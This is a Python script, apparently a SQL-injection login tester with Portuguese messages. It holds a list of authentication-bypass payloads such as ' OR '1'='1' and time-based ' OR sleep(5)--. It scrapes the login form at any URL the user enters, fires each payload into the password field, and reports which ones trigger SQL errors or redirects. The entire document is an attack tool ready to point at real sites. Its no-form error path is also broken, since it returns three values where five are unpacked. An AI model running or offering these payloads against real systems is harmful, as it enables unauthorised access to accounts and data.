import requests
from bs4 import BeautifulSoup

payloads = [
    "' OR '1'='1",
    "' OR 1=1--",
    "' OR '1'='1' --",
    "' OR 1=1#",
    "' OR 1=1/*",
    "admin' --",
    "' OR '1'='1' /*",
    "' OR sleep(5)--",
    "\" OR \"\"=\"",
    "' OR ''='",
]

def extract_form_fields(html):
    soup = BeautifulSoup(html, 'html.parser')
    form = soup.find('form')
    if not form:
        print("[!] Nenhum formulário encontrado.")
        return None, None, None

    action = form.get('action')
    method = form.get('method', 'post').lower()
    inputs = form.find_all('input')
    fields = {}
    user_field = None
    pass_field = None

    for input_tag in inputs:
        name = input_tag.get('name')
        input_type = input_tag.get('type', 'text')

        if not name:
            continue

        if input_type in ['text', 'email'] and not user_field:
            user_field = name
        elif input_type == 'password' and not pass_field:
            pass_field = name
        fields[name] = ''

    return action, method, fields, user_field, pass_field

def test_sql_injection(url, username):
    session = requests.Session()
    print("[-] Acessando página de login...")
    resp = session.get(url)
    action, method, fields, user_field, pass_field = extract_form_fields(resp.text)

    if not all([action, user_field, pass_field]):
        print("[!] Não foi possível identificar os campos do formulário.")
        return

    login_url = action if action.startswith("http") else requests.compat.urljoin(url, action)
    working_payloads = []

    print(f"\n[*] Testando payloads em: {login_url}")
    for payload in payloads:
        data = fields.copy()
        data[user_field] = username
        data[pass_field] = payload

        try:
            if method == 'post':
                response = session.post(login_url, data=data)
            else:
                response = session.get(login_url, params=data)

            if any(err in response.text.lower() for err in ['sql', 'syntax', 'mysql', 'warning', 'error']):
                print(f"[!] Erro SQL detectado com payload: {payload}")
                working_payloads.append(payload)
            elif response.url != login_url:
                print(f"[+] Resposta diferente com payload: {payload}")
                working_payloads.append(payload)

        except Exception as e:
            print(f"[!] Erro com payload {payload}: {e}")

    print("\n[✓] Testes finalizados.")
    if working_payloads:
        print("\n[+] Payloads que deram resposta suspeita:")
        for p in working_payloads:
            print(f" - {p}")
    else:
        print("[-] Nenhuma falha aparente detectada.")

if __name__ == '__main__':
    print("=== SQL Injection Login Tester (Senha Focada) ===\n")
    url = input("Insira a URL da página de login: ").strip()
    username = input("Insira o nome de usuário para testar: ").strip()
    test_sql_injection(url, username)
